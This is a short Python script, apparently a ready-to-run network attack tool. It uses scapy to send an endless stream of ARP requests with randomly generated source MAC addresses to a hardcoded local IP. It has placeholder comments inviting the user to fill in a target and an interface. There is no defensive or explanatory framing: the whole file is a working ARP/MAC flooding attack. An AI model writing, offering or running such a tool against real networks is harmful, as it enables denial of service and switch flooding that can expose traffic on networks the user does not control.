from scapy.all import ARP, send, conf
import random
import time

def generate_random_mac():
    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])

def mac_flood(target_ip, interface="eth0"):  # Specify your network interface
    conf.iface = interface
    while True:
        random_mac = generate_random_mac()
        arp_packet = ARP(op=1, pdst=target_ip, hwsrc=random_mac)
        send(arp_packet, verbose=False)
        time.sleep(0.01)  # Slight delay

target_ip = "192.168.88.18"  # Replace with your target's IP
mac_flood(target_ip, "Wi-Fi")  # Replace "eth0" with your network interface
